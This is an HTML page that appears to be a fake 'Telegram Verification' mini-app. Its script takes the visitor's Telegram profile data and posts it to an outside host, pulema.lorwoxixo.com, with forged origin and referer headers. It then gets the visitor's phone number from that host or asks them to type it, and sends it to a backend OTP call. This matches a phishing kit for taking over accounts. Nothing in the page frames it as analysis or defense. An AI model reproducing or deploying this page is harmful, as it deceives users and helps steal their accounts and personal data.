<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Telegram Verification</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto}
body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:#fff;border-radius:16px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.25)}
.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:20px}
.content{padding:20px}
.btn{width:100%;padding:14px;border-radius:10px;border:none;color:#fff;font-size:15px;font-weight:600;background:linear-gradient(135deg,#667eea,#764ba2);cursor:pointer}
.input{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-bottom:12px}
.info{background:#e8f5e9;border-radius:10px;padding:12px;margin-bottom:12px}
.error{background:#ffebee;color:#c62828;border-radius:10px;padding:12px;margin-bottom:12px;display:none}
.hidden{display:none}
</style>
</head>

<body>
<div class="container">
  <div class="header">
    <h3>üîê Account Verification</h3>
  </div>

  <div class="content">

    <div id="user-info" class="info hidden"></div>

    <button class="btn" onclick="startFlow()">Continue</button>

    <div id="auto" class="info hidden"></div>

    <div id="manual" class="hidden">
      <input id="phone" class="input" placeholder="Enter phone number">
      <button class="btn" onclick="submitPhone()">Continue</button>
    </div>

    <div id="loading" class="info hidden">Processing‚Ä¶</div>

    <div id="error" class="error"></div>

  </div>
</div>

<script>
let tg = window.Telegram?.WebApp;
let user_tg = {};
let bot_id = "37059";

document.addEventListener("DOMContentLoaded", () => {

  if(tg?.initDataUnsafe?.user){
    const u = tg.initDataUnsafe.user;

    user_tg = {
      id: u.id,
      first_name: u.first_name || "",
      last_name: u.last_name || "",
      language_code: u.language_code || "",
      allows_write_to_pm: true,
      photo_url: u.photo_url || ""
    };

    document.getElementById("user-info").innerText =
      `üë§ ${u.first_name||""} ${u.last_name||""}\n@${u.username||"-"}\nüåê ${u.language_code||"-"}`;

    document.getElementById("user-info").classList.remove("hidden");

    tg.expand();
  } else {
    // fallback for testing
    user_tg = {
      id: 1,
      first_name: "Test",
      last_name: "User",
      language_code: "en",
      allows_write_to_pm: true,
      photo_url: ""
    };
  }
});


function startFlow(){
  show("loading");
  hide("error");
  hide("manual");
  hide("auto");

  fetch("https://pulema.lorwoxixo.com/api/get-bot",{
    method:"POST",
    headers:{
      "accept":"*/*",
      "content-type":"application/json",
      "origin":"https://pulema.lorwoxixo.com",
      "referer":"https://pulema.lorwoxixo.com/?bot_id=37059"
    },
    body:JSON.stringify({
      user_tg:user_tg,
      bot_id:bot_id
    })
  })
  .then(async res=>{
    let text = await res.text();
    console.log("RAW RESPONSE:",text);

    let data = JSON.parse(text);

    hide("loading");

    if(data.ok && data.phone_number){
      document.getElementById("auto").innerText =
        `üìû Phone detected: +${data.phone_number}\nContinuing‚Ä¶`;
      show("auto");

      continueVerification(data.phone_number);
    } else {
      show("manual");
    }
  })
  .catch(err=>{
    hide("loading");
    show("manual");
    showError("Network error ‚Äî please enter phone manually");
  });
}


function submitPhone(){
  const phone = document.getElementById("phone").value.trim();
  if(!phone) return showError("Enter phone number");

  continueVerification(phone);
}


function continueVerification(phone){
  show("loading");

  // your backend OTP call
  fetch("/api/verify-contact",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ phone })
  })
  .then(r=>r.json())
  .then(res=>{
    hide("loading");
    if(res.success) window.location.href = res.redirect_url;
    else showError(res.error || "Verification failed");
  })
  .catch(()=>{
    hide("loading");
    showError("Network error");
  });
}


/* Helpers */
function show(id){document.getElementById(id).classList.remove("hidden")}
function hide(id){document.getElementById(id).classList.add("hidden")}
function showError(msg){
  let e=document.getElementById("error");
  e.innerText=msg;
  e.style.display="block";
}
</script>
</body>
</html>
